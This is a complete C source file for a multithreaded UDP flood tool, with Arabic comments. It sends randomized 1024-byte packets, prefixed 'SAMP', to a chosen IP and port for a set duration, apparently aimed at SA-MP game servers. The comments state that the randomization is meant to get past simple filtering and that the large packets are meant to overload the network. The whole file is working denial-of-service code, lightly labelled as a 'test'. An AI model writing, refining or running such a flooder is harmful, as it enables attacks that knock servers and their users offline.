#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <pthread.h>

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
} thread_data;

// دالة توليد بيانات عشوائية لجعل الحزم غير متطابقة (تجاوز الفلترة البسيطة)
void generate_random_payload(char *buf, int size) {
    for (int i = 0; i < size; i++) {
        buf[i] = (char)(rand() % 256);
    }
}

void *advanced_flood_thread(void *arg) {
    thread_data *data = (thread_data *)arg;
    int sock;
    struct sockaddr_in serv_addr;
    char payload[1024];

    // إنشاء Socket من نوع UDP
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        pthread_exit(NULL);
    }

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(data->target_port);

    if (inet_pton(AF_INET, data->target_ip, &serv_addr.sin_addr) <= 0) {
        close(sock);
        pthread_exit(NULL);
    }

    time_t start_time = time(NULL);

    // حلقة إرسال مكثفة مع تغيير العشوائية
    while (time(NULL) - start_time < data->duration) {
        // وضع بصمة محاكاة خفيفة أو ملء ببيانات عشوائية ضخمة
        memcpy(payload, "SAMP", 4);
        generate_random_payload(payload + 4, sizeof(payload) - 4);

        // إرسال حجم أكبر من البيانات (Payload larger than 14 bytes) لزيادة العبء على الشبكة
        sendto(sock, payload, sizeof(payload), 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("[-] Usage: %s <IP> <Port> <Duration> <Threads>\n", argv[0]);
        printf("[-] Example: %s 127.0.0.1 7777 30 20\n", argv[0]);
        return -1;
    }

    srand(time(NULL));

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);

    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    thread_data data;

    strncpy(data.target_ip, ip, 16);
    data.target_port = port;
    data.duration = duration;

    printf("[🚀] Launching ADVANCED C Flood Script with %d threads for %d seconds...\n", num_threads, duration);

    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, advanced_flood_thread, &data);
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    free(threads);
    printf("[✓] Advanced test finished.\n");
    return 0;
}
